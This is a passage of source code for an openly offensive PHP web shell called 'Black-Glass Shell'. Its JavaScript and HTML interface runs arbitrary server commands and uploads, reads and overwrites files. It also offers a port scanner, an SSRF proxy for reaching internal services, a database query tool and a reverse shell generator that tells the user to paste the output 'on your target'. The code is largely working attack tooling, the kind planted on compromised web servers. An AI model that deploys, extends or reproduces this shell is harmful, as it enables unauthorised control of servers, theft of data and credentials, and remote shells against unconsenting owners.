                        <?= htmlspecialchars($sapi) ?></span></div>
                <div class="l" style="color:#0a5c1e;">[SERVER] <span
                        style="color:#00ff41;"><?= htmlspecialchars($server_software) ?></span></div>
                <div class="l" style="color:#0a5c1e;">[DOCROOT] <span
                        style="color:#00ff41;"><?= htmlspecialchars($doc_root) ?></span></div>
                <div class="l" style="color:#0a5c1e;">[CWD] <span
                        style="color:#00ff41;"><?= htmlspecialchars($cwd) ?></span></div>
                <div class="l" style="color:#0a5c1e;">[DISK] <span
                        style="color:#00ff41;"><?= htmlspecialchars($disk_free) ?> free /
                        <?= htmlspecialchars($disk_total) ?> total</span></div>
                <div class="l"><br></div>
                <div class="l" style="color:#00ff41;">[+] Black-Glass Shell Ready — All OS Compatible</div>
                <button onclick="window.open('https://github.com/ram-prasad-sahoo/BLACK-GLASS','_blank')" style="background:#0d1117;color:#00ff41;border:1px solid #00ff41;padding:5px 10px;">[+] Crafted by Ram ☠</button>
                <?php if ($cmd_result): ?>
                    <div class="l prompt"><span class="log">[☠]</span><span class="p"> <?= htmlspecialchars($cwd) ?>
                        </span>$ <?= htmlspecialchars($last_cmd) ?></div>
                    <div class="l out"><?= nl2br($cmd_result) ?></div>
                    <div class="l"><br></div>
                <?php endif; ?>
            </div>

            <div class="input-area">
                <span class="ps1">
                    <span class="log">[☠]</span>
                    <span class="pth" id="ps1path"> <?= htmlspecialchars($cwd) ?> </span>
                    <span>$</span>
                </span>
                <input type="text" id="cmdinput" placeholder="Type Command..." spellcheck="false" autocomplete="off"
                    autofocus>
                <button class="run" onclick="execCmd()">▶ Run</button>
                <button class="cls" onclick="clearTerm()">✕ Clear</button>
            </div>

            <div class="upload-panel">
                <form method="post" enctype="multipart/form-data" id="uploadForm" onsubmit="return validateUpload()">
                    <label class="file-label" for="upload_file" id="fileLabel">Choose File</label>
                    <input type="file" name="upload_file" id="upload_file" onchange="updateFileName(this)">
                    <span class="file-name" id="fileName">No file selected</span>
                    <button type="submit" name="upload" value="1" class="up-btn">Upload</button>
                </form>
                <span id="notificationMessage"
                    style="font-size: 10px; flex: 1; text-align: center; display: inline-flex; align-items: center; justify-content: center; line-height: 1; height: 20px;"></span>
                <div
                    style="font-size: 11px; color: #2a6a2a; font-weight: 300; display: inline-flex; align-items: center; line-height: 1; height: 20px;">
                    Crafted by <span
                        style="color: #00ff41; text-decoration: none; font-weight: 500; margin-left: 4px; text-shadow: 0 0 5px rgba(0,255,65,0.3);">Ram</span>
                    <span style="color:#0a3a0a;margin-left:8px;">| BG v1.0</span>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== MODAL OVERLAY for all advanced GUI windows ===== -->
    <div class="bg-overlay" id="bgOverlay">
        <div class="bg-modal" id="bgModal">
            <div class="bg-modal-header">
                <h3 id="bgModalTitle">BLACK-GLASS Tool</h3>
                <button class="close-btn" onclick="closeModal()">✕ Close</button>
            </div>
            <div class="bg-modal-body" id="bgModalBody">
                <!-- Dynamic content loaded here -->
            </div>
            <div class="bg-modal-footer" id="bgModalFooter">
                <!-- Dynamic footer buttons -->
            </div>
        </div>
    </div>

    <script>
        // ==================== ORIGINAL PHANTOM SCRIPTS (PRESERVED) ====================
        var curDir = <?= json_encode($cwd) ?>;
        var dirStack = [];
        var stackIdx = -1;
        var hist = [];
        var hidx = -1;

        function execCmd() {
            var inp = document.getElementById('cmdinput');
            var c = inp.value.trim();
            if (!c) return;
            hist.push(c);
            hidx = hist.length;
            addLine('<span class="l prompt"><span class="log">[☠]</span><span class="p"> ' + esc(curDir) + ' </span>$ ' + esc(c) + '</span>');
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var out = xhr.responseText;
                    if (out.trim()) addLine('<span class="l out">' + esc(out) + '</span>');
                    else addLine('<span class="l info">[+] completed (no output)</span>');
                    scrollBtm();
                    checkRefresh(c);
                }
            };
            xhr.send('ajax=1&cmd=' + encodeURIComponent(c) + '&cwd=' + encodeURIComponent(curDir));
            inp.value = '';
            inp.focus();
        }

        function cmd(c) { document.getElementById('cmdinput').value = c; execCmd(); }

        function addLine(h) {
            var o = document.getElementById('output');
            var d = document.createElement('div');
            d.innerHTML = h;
            o.appendChild(d);
            scrollBtm();
        }

        function scrollBtm() { var o = document.getElementById('output'); o.scrollTop = o.scrollHeight; }
        function clearTerm() { document.getElementById('output').innerHTML = '<div class="l info">[+] terminal cleared</div><div class="l"><br></div>'; }
        function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

        document.addEventListener('keydown', function (e) {
            var inp = document.getElementById('cmdinput');
            if (document.activeElement !== inp) return;
            if (e.key === 'Enter') { e.preventDefault(); execCmd(); }
            else if (e.key === 'ArrowUp') { e.preventDefault(); if (hidx > 0) { hidx--; inp.value = hist[hidx]; } }
            else if (e.key === 'ArrowDown') { e.preventDefault(); if (hidx < hist.length - 1) { hidx++; inp.value = hist[hidx]; } else { hidx = hist.length; inp.value = ''; } }
        });

        function updateFileName(input) {
            var nameSpan = document.getElementById('fileName');
            var label = document.getElementById('fileLabel');
            if (input.files && input.files.length > 0) {
                nameSpan.textContent = input.files[0].name;
                label.textContent = 'Change File';
                label.style.borderColor = '#00ff41';
                label.style.color = '#00ff41';
            } else {
                nameSpan.textContent = 'No file selected';
                label.textContent = 'Choose File';
                label.style.borderColor = '';
                label.style.color = '';
            }
        }

        function validateUpload() {
            var fileInput = document.getElementById('upload_file');
            if (!fileInput.files || fileInput.files.length === 0) {
                showBarNotification('⚠️ Please select a file to upload!', 'warning');
                return false;
            }
            return true;
        }

        function refreshFB(dir) {
            var d = dir || curDir;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    renderFB(xhr.responseText, d);
                }
            };
            xhr.send('ajax=1&cmd=find . -maxdepth 1 -type d ! -name "." 2>/dev/null | sed "s|^\\./||" | sort&cwd=' + encodeURIComponent(d));
        }

        function renderFB(raw, dir) {
            var names = raw.split('\n').filter(function (l) { return l.trim(); });
            var h = '';
            if (dir !== '/') {
                h += '<div class="fi up back" onclick="goToParent()" style="text-align:center;padding:4px;font-size:10px;" title="Parent Directory">↑ Parent Directory</div>';
            }
            for (var i = 0; i < names.length && i < 100; i++) {
                var n = names[i];
                if (!n || n === '.' || n === '..') continue;
                var en = n.replace(/'/g, "\\'");
                h += '<div class="fi dir" onclick="navigateDir(\'' + en + '\')"><span class="nm">' + esc(n) + '/</span></div>';
            }
            if (names.length === 0) h += '<div style="color:#0a3a0a;padding:4px 12px;font-size:9px;">[no subdirectories]</div>';
            document.getElementById('filebrowser').innerHTML = h;
        }

        function goToParent() {
            var p = curDir.split('/');
            p.pop();
            curDir = p.length > 0 ? p.join('/') : '/';
            if (curDir === '') curDir = '/';
            document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
            refreshFB(curDir);
        }

        function navigateDir(d) {
            curDir = curDir.replace(/\/$/, '') + '/' + d;
            document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
            refreshFB(curDir);
        }

        function checkRefresh(c) {
            var match = c.match(/^cd\s+(.+)$/);
            if (match) {
                var nd = match[1].trim();
                if (/^\.{3,}$/.test(nd)) return;
                var old = curDir;
                if (nd === '..') { var p = curDir.split('/'); p.pop(); curDir = p.length > 0 ? p.join('/') : '/'; }
                else if (nd.indexOf('/') === 0 || nd.indexOf('~') === 0) { curDir = nd; }
                else if (nd.match(/^\.\//)) { curDir = curDir.replace(/\/$/, '') + '/' + nd.substring(2); }
                else { curDir = curDir.replace(/\/$/, '') + '/' + nd; }
                document.getElementById('ps1path').textContent = ' ' + curDir + ' ';
                refreshFB(curDir);
            } else if (c.indexOf('rm ') === 0 || c.indexOf('mv ') === 0 || c.indexOf('mkdir ') === 0 || c.indexOf('touch ') === 0) {
                refreshFB(curDir);
            }
        }

        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('show'); }
        function toggleSec(el) {
            var body = el.nextElementSibling;
            var arrow = el.querySelector('.collapse');
            if (body.classList.contains('hidden')) { body.classList.remove('hidden'); arrow.classList.add('open'); }
            else { body.classList.add('hidden'); arrow.classList.remove('open'); }
        }

        function showBarNotification(message, type) {
            var msg = document.getElementById('notificationMessage');
            if (type === 'success') msg.style.color = '#00ff88';
            else if (type === 'warning') msg.style.color = '#ffcc44';
            else if (type === 'error') msg.style.color = '#ff4466';
            else msg.style.color = '#4a6a8a';
            msg.textContent = message;
            setTimeout(function () { msg.textContent = ''; }, 10000);
        }

        setTimeout(function () { refreshFB(curDir); }, 300);

        <?php if ($show_upload_alert && !empty($upload_msg)): ?>
            showBarNotification('✓ <?= addslashes($upload_msg) ?>', 'success');
        <?php endif; ?>

        // ==================== MODAL MANAGEMENT ====================
        function openModal(title, bodyHTML, footerHTML) {
            document.getElementById('bgModalTitle').textContent = title;
            document.getElementById('bgModalBody').innerHTML = bodyHTML;
            document.getElementById('bgModalFooter').innerHTML = footerHTML || '';
            document.getElementById('bgOverlay').classList.add('active');
        }

        function closeModal() {
            document.getElementById('bgOverlay').classList.remove('active');
        }

        // Close on overlay click
        document.getElementById('bgOverlay').addEventListener('click', function (e) {
            if (e.target === this) closeModal();
        });

        // Close on Escape
        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') closeModal();
        });

        // ==================== AJAX HELPER ====================
        function bgAjax(params, callback) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) callback(xhr.responseText);
            };
            xhr.send(params);
        }

        // ==================== FILE EDITOR ====================
        function openFileEditor() {
            var html = '<div class="bg-form-row">' +
                '<label><span>File Path</span><input type="text" id="bgEditFile" value="' + esc(curDir) + '/" placeholder="/path/to/file"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="loadFile()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">📂 Load File</button>' +
                '</div>' +
                '<textarea id="bgEditContent" placeholder="File content will appear here..."></textarea>' +
                '<div id="bgEditStatus" class="bg-output" style="margin-top:8px;max-height:60px;"></div>';
            var footer = '<button class="primary" onclick="saveFile()">💾 Save File</button><button onclick="closeModal()">Cancel</button>';
            openModal('✏️ File Editor', html, footer);
        }

        function loadFile() {
            var file = document.getElementById('bgEditFile').value;
            document.getElementById('bgEditStatus').innerHTML = '<span class="info">Loading...</span>';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById('bgEditContent').value = xhr.responseText;
                    document.getElementById('bgEditStatus').innerHTML = '<span class="success">✓ Loaded: ' + esc(file) + '</span>';
                }
            };
            xhr.send('bg_read_file=' + encodeURIComponent(file));
        }

        function saveFile() {
            var file = document.getElementById('bgEditFile').value;
            var content = document.getElementById('bgEditContent').value;
            document.getElementById('bgEditStatus').innerHTML = '<span class="info">Saving...</span>';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById('bgEditStatus').innerHTML = '<span class="success">✓ ' + esc(xhr.responseText) + '</span>';
                }
            };
            xhr.send('bg_save_file=' + encodeURIComponent(file) + '&bg_file_content=' + encodeURIComponent(content));
        }

        // ==================== HEX DUMP ====================
        function openHexDump() {
            var html = '<div class="bg-form-row">' +
                '<label><span>File Path</span><input type="text" id="bgHexFile" value="' + esc(curDir) + '/" placeholder="/path/to/file"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runHexDump()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🔍 Dump Hex</button>' +
                '</div>' +
                '<div id="bgHexOutput" class="bg-output"></div>';
            openModal('🔬 Hex Dump Viewer', html, '<button onclick="closeModal()">Close</button>');
        }

        function runHexDump() {
            var file = document.getElementById('bgHexFile').value;
            document.getElementById('bgHexOutput').innerHTML = '<span class="info">Loading...</span>';
            bgAjax('ajax=1&bg_action=hex_dump&file=' + encodeURIComponent(file), function (r) {
                document.getElementById('bgHexOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== FILE SEARCH ====================
        function openSearch() {
            var html = '<div class="bg-tabs">' +
                '<button class="active" onclick="switchSearchTab(this,\'name\')">By Name</button>' +
                '<button onclick="switchSearchTab(this,\'content\')">By Content</button>' +
                '</div>' +
                '<div id="bgSearchName">' +
                '<div class="bg-form-row">' +
                '<label><span>Root Directory</span><input type="text" id="bgSearchRoot" value="' + esc(curDir) + '"></label>' +
                '<label><span>Pattern</span><input type="text" id="bgSearchPattern" placeholder="*.php, *.conf, etc."></label>' +
                '</div>' +
                '<button class="primary" onclick="runSearch(\'name\')" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🔍 Search</button>' +
                '</div>' +
                '<div id="bgSearchContent" style="display:none;">' +
                '<div class="bg-form-row">' +
                '<label><span>Root Directory</span><input type="text" id="bgSearchRoot2" value="' + esc(curDir) + '"></label>' +
                '<label><span>Search String</span><input type="text" id="bgSearchString" placeholder="text to find"></label>' +
                '</div>' +
                '<button class="primary" onclick="runSearch(\'content\')" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🔍 Search</button>' +
                '</div>' +
                '<div id="bgSearchOutput" class="bg-output"></div>';
            openModal('🔎 Advanced File Search', html, '<button onclick="closeModal()">Close</button>');
        }

        function switchSearchTab(el, tab) {
            document.querySelectorAll('.bg-tabs button').forEach(function (b) { b.classList.remove('active'); });
            el.classList.add('active');
            document.getElementById('bgSearchName').style.display = tab === 'name' ? 'block' : 'none';
            document.getElementById('bgSearchContent').style.display = tab === 'content' ? 'block' : 'none';
        }

        function runSearch(type) {
            var root, pattern;
            if (type === 'name') {
                root = document.getElementById('bgSearchRoot').value;
                pattern = document.getElementById('bgSearchPattern').value;
            } else {
                root = document.getElementById('bgSearchRoot2').value;
                pattern = document.getElementById('bgSearchString').value;
            }
            document.getElementById('bgSearchOutput').innerHTML = '<span class="info">Searching...</span>';
            bgAjax('ajax=1&bg_action=' + (type === 'name' ? 'search_files' : 'search_content') + '&root=' + encodeURIComponent(root) + '&' + (type === 'name' ? 'pattern' : 'string') + '=' + encodeURIComponent(pattern), function (r) {
                document.getElementById('bgSearchOutput').innerHTML = r.trim() ? '<pre>' + esc(r) + '</pre>' : '<span class="info">No results found.</span>';
            });
        }

        // ==================== FILE METADATA ====================
        function openFileMeta() {
            var html = '<div class="bg-form-row">' +
                '<label><span>File Path</span><input type="text" id="bgMetaFile" value="' + esc(curDir) + '/" placeholder="/path/to/file"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runFileMeta()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">📋 Get Info</button>' +
                '</div>' +
                '<div id="bgMetaOutput" class="bg-output"></div>';
            openModal('📄 File Metadata', html, '<button onclick="closeModal()">Close</button>');
        }

        function runFileMeta() {
            var file = document.getElementById('bgMetaFile').value;
            document.getElementById('bgMetaOutput').innerHTML = '<span class="info">Loading...</span>';
            bgAjax('ajax=1&bg_action=file_metadata&file=' + encodeURIComponent(file), function (r) {
                document.getElementById('bgMetaOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== ZIP TOOL ====================
        function openZipTool() {
            var html = '<div class="bg-tabs">' +
                '<button class="active" onclick="switchZipTab(this,\'create\')">Create ZIP</button>' +
                '<button onclick="switchZipTab(this,\'extract\')">Extract ZIP</button>' +
                '</div>' +
                '<div id="bgZipCreate">' +
                '<div class="bg-form-row">' +
                '<label><span>Source (file/dir)</span><input type="text" id="bgZipSource" value="' + esc(curDir) + '" placeholder="/path/to/source"></label>' +
                '<label><span>Destination .zip</span><input type="text" id="bgZipDest" placeholder="/path/to/output.zip"></label>' +
                '</div>' +
                '<button class="primary" onclick="runZip(\'create\')" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">📦 Create ZIP</button>' +
                '</div>' +
                '<div id="bgZipExtract" style="display:none;">' +
                '<div class="bg-form-row">' +
                '<label><span>ZIP File</span><input type="text" id="bgZipFile" placeholder="/path/to/file.zip"></label>' +
                '<label><span>Extract To (optional)</span><input type="text" id="bgZipExtractDest" placeholder="leave empty for same dir"></label>' +
                '</div>' +
                '<button class="primary" onclick="runZip(\'extract\')" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">📂 Extract ZIP</button>' +
                '</div>' +
                '<div id="bgZipOutput" class="bg-output"></div>';
            openModal('🗜️ Zip/Archive Tool', html, '<button onclick="closeModal()">Close</button>');
        }

        function switchZipTab(el, tab) {
            document.querySelectorAll('#bgZipCreate, #bgZipExtract').forEach(function (e) { e.style.display = 'none'; });
            document.querySelectorAll('#bgZipTool .bg-tabs button').forEach(function (b) { b.classList.remove('active'); });
            el.classList.add('active');
            document.getElementById('bgZip' + tab.charAt(0).toUpperCase() + tab.slice(1)).style.display = 'block';
        }

        function runZip(action) {
            var params;
            if (action === 'create') {
                params = 'ajax=1&bg_action=zip_create&source=' + encodeURIComponent(document.getElementById('bgZipSource').value) + '&destination=' + encodeURIComponent(document.getElementById('bgZipDest').value);
            } else {
                params = 'ajax=1&bg_action=zip_extract&source=' + encodeURIComponent(document.getElementById('bgZipFile').value) + '&dest=' + encodeURIComponent(document.getElementById('bgZipExtractDest').value || '');
            }
            document.getElementById('bgZipOutput').innerHTML = '<span class="info">Processing...</span>';
            bgAjax(params, function (r) {
                document.getElementById('bgZipOutput').innerHTML = '<span class="success">' + esc(r) + '</span>';
            });
        }

        // ==================== PERMISSIONS ====================
        function openChmod() {
            var html = '<div class="bg-form-row">' +
                '<label><span>File/Directory Path</span><input type="text" id="bgChmodFile" value="' + esc(curDir) + '/" placeholder="/path/to/file"></label>' +
                '<label><span>Permissions (e.g. 755)</span><input type="text" id="bgChmodPerms" placeholder="755" value="755"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runChmod()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🔑 Set Permissions</button>' +
                '</div>' +
                '<div id="bgChmodOutput" class="bg-output"></div>';
            openModal('🔐 Permissions Manager', html, '<button onclick="closeModal()">Close</button>');
        }

        function runChmod() {
            var file = document.getElementById('bgChmodFile').value;
            var perms = document.getElementById('bgChmodPerms').value;
            document.getElementById('bgChmodOutput').innerHTML = '<span class="info">Changing permissions...</span>';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById('bgChmodOutput').innerHTML = '<span class="success">' + esc(xhr.responseText) + '</span>';
                }
            };
            xhr.send('ajax=1&bg_action=chmod&file=' + encodeURIComponent(file) + '&perms=' + encodeURIComponent(perms));
        }

        // ==================== PORT SCANNER ====================
        function openPortScan() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Host/IP</span><input type="text" id="bgScanHost" placeholder="127.0.0.1 or target.com"></label>' +
                '<label><span>Ports</span><input type="text" id="bgScanPorts" value="1-1024" placeholder="22,80,443 or 1-1000"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runPortScan()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🌐 Scan Ports</button>' +
                '</div>' +
                '<div id="bgScanOutput" class="bg-output"></div>';
            openModal('🌐 Port Scanner', html, '<button onclick="closeModal()">Close</button>');
        }

        function runPortScan() {
            var host = document.getElementById('bgScanHost').value;
            var ports = document.getElementById('bgScanPorts').value;
            if (!host) { alert('Enter a host'); return; }
            document.getElementById('bgScanOutput').innerHTML = '<span class="info">Scanning ' + esc(host) + ':' + esc(ports) + '...</span>';
            bgAjax('ajax=1&bg_action=port_scan&host=' + encodeURIComponent(host) + '&ports=' + encodeURIComponent(ports), function (r) {
                document.getElementById('bgScanOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== WHOIS ====================
        function openWhois() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Domain</span><input type="text" id="bgWhoisDomain" placeholder="example.com"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runWhois()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🔍 WHOIS Lookup</button>' +
                '</div>' +
                '<div id="bgWhoisOutput" class="bg-output"></div>';
            openModal('🔍 WHOIS Lookup', html, '<button onclick="closeModal()">Close</button>');
        }

        function runWhois() {
            var domain = document.getElementById('bgWhoisDomain').value;
            if (!domain) { alert('Enter a domain'); return; }
            document.getElementById('bgWhoisOutput').innerHTML = '<span class="info">Looking up...</span>';
            bgAjax('ajax=1&bg_action=whois&domain=' + encodeURIComponent(domain), function (r) {
                document.getElementById('bgWhoisOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== DNS LOOKUP ====================
        function openDNSLookup() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Domain</span><input type="text" id="bgDNSDomain" placeholder="example.com"></label>' +
                '<label><span>Record Type</span><select id="bgDNSType"><option value="ANY">ANY</option><option value="A">A</option><option value="AAAA">AAAA</option><option value="MX">MX</option><option value="CNAME">CNAME</option><option value="NS">NS</option><option value="TXT">TXT</option><option value="SOA">SOA</option></select></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runDNSLookup()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🌐 DNS Lookup</button>' +
                '</div>' +
                '<div id="bgDNSOutput" class="bg-output"></div>';
            openModal('🌐 DNS Lookup', html, '<button onclick="closeModal()">Close</button>');
        }

        function runDNSLookup() {
            var domain = document.getElementById('bgDNSDomain').value;
            var type = document.getElementById('bgDNSType').value;
            if (!domain) { alert('Enter a domain'); return; }
            document.getElementById('bgDNSOutput').innerHTML = '<span class="info">Resolving...</span>';
            bgAjax('ajax=1&bg_action=dns&domain=' + encodeURIComponent(domain) + '&record=' + encodeURIComponent(type), function (r) {
                document.getElementById('bgDNSOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== SSRF PROXY ====================
        function openSSRF() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Target URL</span><input type="text" id="bgSSRFUrl" placeholder="http://internal.service/admin"></label>' +
                '<label><span>Method</span><select id="bgSSRFMethod"><option value="GET">GET</option><option value="POST">POST</option></select></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<label><span>Headers (one per line)</span><textarea id="bgSSRFHeaders" rows="3" style="background:#050810;border:1px solid #1a2a3a;border-radius:3px;padding:6px;color:var(--white);font-family:inherit;font-size:11px;" placeholder="X-Forwarded-For: 127.0.0.1"></textarea></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<label><span>POST Body</span><textarea id="bgSSRFBody" rows="3" style="background:#050810;border:1px solid #1a2a3a;border-radius:3px;padding:6px;color:var(--white);font-family:inherit;font-size:11px;"></textarea></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runSSRF()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">🚀 Send Request</button>' +
                '</div>' +
                '<div id="bgSSRFOutput" class="bg-output"></div>';
            openModal('🌐 SSRF / HTTP Proxy', html, '<button onclick="closeModal()">Close</button>');
        }

        function runSSRF() {
            var url = document.getElementById('bgSSRFUrl').value;
            var method = document.getElementById('bgSSRFMethod').value;
            var headers = document.getElementById('bgSSRFHeaders').value;
            var body = document.getElementById('bgSSRFBody').value;
            if (!url) { alert('Enter a URL'); return; }
            document.getElementById('bgSSRFOutput').innerHTML = '<span class="info">Sending request...</span>';
            bgAjax('ajax=1&bg_action=ssrf&url=' + encodeURIComponent(url) + '&method=' + encodeURIComponent(method) + '&headers=' + encodeURIComponent(headers) + '&body=' + encodeURIComponent(body), function (r) {
                document.getElementById('bgSSRFOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== REVERSE SHELL GENERATOR ====================
        function openRevShell() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Your IP</span><input type="text" id="bgRevIP" placeholder="10.10.10.1"></label>' +
                '<label><span>Port</span><input type="text" id="bgRevPort" value="4444" placeholder="4444"></label>' +
                '<label><span>Type</span><select id="bgRevType"><option value="bash">Bash</option><option value="python">Python3</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="perl">Perl</option><option value="powershell">PowerShell</option></select></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="genRevShell()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">⚡ Generate Shell</button>' +
                '</div>' +
                '<div id="bgRevOutput" class="bg-output" style="max-height:300px;"></div>';
            openModal('⚡ Reverse Shell Generator', html, '<button onclick="closeModal()">Close</button>');
        }

        function genRevShell() {
            var ip = document.getElementById('bgRevIP').value;
            var port = document.getElementById('bgRevPort').value;
            var type = document.getElementById('bgRevType').value;
            if (!ip || !port) { alert('Enter IP and Port'); return; }
            document.getElementById('bgRevOutput').innerHTML = '<span class="info">Generating...</span>';
            bgAjax('ajax=1&bg_action=rev_shell&ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port) + '&type=' + encodeURIComponent(type), function (r) {
                document.getElementById('bgRevOutput').innerHTML = '<pre class="success">' + esc(r) + '</pre><div style="margin-top:8px;font-size:10px;color:#5a7a9a;">Copy and paste this command on your target.</div>';
            });
        }

        // ==================== DATABASE QUERY ====================
        function openDBQuery() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Type</span><select id="bgDBType"><option value="mysql">MySQL</option><option value="postgresql">PostgreSQL</option><option value="sqlite">SQLite</option><option value="mssql">MSSQL</option></select></label>' +
                '<label><span>Host</span><input type="text" id="bgDBHost" value="127.0.0.1" placeholder="127.0.0.1"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<label><span>Username</span><input type="text" id="bgDBUser" placeholder="root"></label>' +
                '<label><span>Password</span><input type="password" id="bgDBPass" placeholder="password"></label>' +
                '<label><span>Database</span><input type="text" id="bgDBName" placeholder="database_name"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<label><span>SQL Query</span><textarea id="bgDBQuery" rows="4" style="background:#050810;border:1px solid #1a2a3a;border-radius:3px;padding:8px;color:var(--white);font-family:inherit;font-size:12px;" placeholder="SELECT * FROM users LIMIT 10"></textarea></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runDBQuery()" style="padding:7px 18px;background:linear-gradient(135deg,#004488,#0066bb);border:1px solid #00aaff;border-radius:3px;color:white;cursor:pointer;font-family:inherit;font-size:11px;">▶ Execute</button>' +
                '</div>' +
                '<div id="bgDBOutput" class="bg-output"></div>';
            openModal('🗄️ Database Query Browser', html, '<button onclick="closeModal()">Close</button>');
        }

        function runDBQuery() {
            var params = 'ajax=1&bg_action=db_query' +
                '&db_type=' + encodeURIComponent(document.getElementById('bgDBType').value) +
                '&db_host=' + encodeURIComponent(document.getElementById('bgDBHost').value) +
                '&db_user=' + encodeURIComponent(document.getElementById('bgDBUser').value) +
                '&db_pass=' + encodeURIComponent(document.getElementById('bgDBPass').value) +
                '&db_name=' + encodeURIComponent(document.getElementById('bgDBName').value) +
                '&db_query=' + encodeURIComponent(document.getElementById('bgDBQuery').value);
            document.getElementById('bgDBOutput').innerHTML = '<span class="info">Executing...</span>';
            bgAjax(params, function (r) {
                try {
                    var data = JSON.parse(r);
                    if (Array.isArray(data) && data.length > 0) {
                        var headers = Object.keys(data[0]);
                        var table = '<table class="bg-db-table"><thead><tr>';
                        headers.forEach(function (h) { table += '<th>' + esc(h) + '</th>'; });
                        table += '</tr></thead><tbody>';
                        data.forEach(function (row) {
                            table += '<tr>';
                            headers.forEach(function (h) {
